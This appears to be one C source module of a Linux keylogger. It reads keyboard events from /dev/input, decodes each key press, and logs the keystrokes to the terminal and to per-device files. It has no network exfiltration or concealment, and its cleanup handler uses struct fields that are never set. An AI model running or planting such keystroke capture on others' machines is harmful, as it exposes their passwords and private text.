/* kb_reader.c */
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <linux/input-event-codes.h>
#include <string.h>

#include <kb_worker.h>
#include <kb_mapper.h>
#include <kb_decoder.h>
#include <logs/logger.h>
#include <constants/constants.h>
#include <file/file_handler.h>
#include <mem.h>

#define DONT_RESET      0
#define RESET           1

#define FAILED_TO_READ "Failed to read event file"
#define FAILED_TO_OPEN "Failed to open event file"
#define DISCONNECTED   "Disconnected"

#define START_CAPTURE  "Start capturing..."
#define RESETTING      "Resetting..."

#ifndef KEYSTROKE_BUFFER_CLEANER
#define KEYSTROKE_BUFFER_CLEANER(KEYSTROKE_BUFFER) {    \
        free(KEYSTROKE_BUFFER);                         \
}
#endif

struct kb_worker_cleanup_infos {
    struct kb_worker *kb_worker;
    size_t keystroke_buffer_s;
    char **keystroke_buffer;
    int    device_file_fd;
    int    reset;
};

static void killed_worker(void *arg) {
    // Cleanup handler.
    struct kb_worker_cleanup_infos *cleanup_infos = (struct kb_worker_cleanup_infos *) arg;
    // Close the open device files.
    if (cleanup_infos->device_file_fd != -1) close(cleanup_infos->device_file_fd);
    // Set worker state.
    if (cleanup_infos->reset) {
        cleanup_infos->kb_worker->kb_status = KB_WORKER_RESET;
        make_terminal_log(RESETTING, cleanup_infos->kb_worker->kb_id);
    }
    else {
        cleanup_infos->kb_worker->kb_status = KB_WORKER_FAILED;
        make_terminal_log(DISCONNECTED, cleanup_infos->kb_worker->kb_id);
    }
    // Clean the keystroke buffer.
    append_to_file((const char **) cleanup_infos->keystroke_buffer,
                   cleanup_infos->keystroke_buffer_s, cleanup_infos->kb_worker->kb_id);

    KEYSTROKE_BUFFER_CLEANER(cleanup_infos->keystroke_buffer);
}

_Noreturn void *start_worker(void *worker) {
    struct kb_worker_cleanup_infos cleanup_infos;
    struct kb_worker *worker_infos = (struct kb_worker *) worker;
    struct input_event device_event; // Current keyboard device event.
    struct kb_dec_key *decoded;
    size_t keystroke_buffer_s = 1;
    char **keystroke_buffer;
    ALLOC_MEM(keystroke_buffer, keystroke_buffer_s, sizeof(char **));
    char *device_event_path;
    ALLOC_MEM(device_event_path, strlen(worker_infos->kb_event_file), sizeof(char));
    pthread_cleanup_push(killed_worker, (void *) &cleanup_infos);
    // Remove an empty extra character that came from the parse.
    strncpy(device_event_path, worker_infos->kb_event_file, strlen(worker_infos->kb_event_file) - 1);

    int device_fd = open(device_event_path, O_RDONLY);
    free(device_event_path);
    if (device_fd == -1) {
        make_terminal_log(FAILED_TO_OPEN, worker_infos->kb_id);
        cleanup_infos.kb_worker = worker_infos;
        cleanup_infos.device_file_fd = -1;
        cleanup_infos.reset = DONT_RESET;
        pthread_exit(0);
    }
    // Save the cleanup data.
    cleanup_infos.kb_worker = worker_infos;
    cleanup_infos.device_file_fd = device_fd;
    cleanup_infos.reset = RESET;

    make_terminal_log(START_CAPTURE, worker_infos->kb_id);
    while (TRUE) {
        if (read(device_fd, &device_event, sizeof(device_event)) == -1) {
            make_terminal_log(FAILED_TO_READ, worker_infos->kb_id);
            cleanup_infos.reset = DONT_RESET;
            pthread_exit(0);
        }

        if (worker_infos->kb_status == KB_WORKER_INITIAL) create_log_file(worker_infos->kb_id);
        if (worker_infos->kb_status != KB_WORKER_RUNNING) worker_infos->kb_status = KB_WORKER_RUNNING;

        if (device_event.type == 1 && device_event.value == 1) {
            decoded = decode(device_event.code);
            if (decoded == NULL) continue;
            make_keystroke_log(decoded->kb_key_name, worker_infos->kb_id);
            keystroke_buffer[keystroke_buffer_s - 1] = decoded->kb_key_name;
            REALLOC_MEM(keystroke_buffer, ++keystroke_buffer_s, sizeof(char **));
            if (decoded->kb_key_code == KEY_ENTER) {
                // Save the contents of the buffer.
                append_to_file((const char **) keystroke_buffer, keystroke_buffer_s, worker_infos->kb_id);
                // Clear the buffer.
                KEYSTROKE_BUFFER_CLEANER(keystroke_buffer);
                // Realloc the buffer.
                ALLOC_MEM(keystroke_buffer, 1, sizeof(char **));
                keystroke_buffer_s = 1;
            }
        }

    }
    pthread_cleanup_pop(killed_worker);
}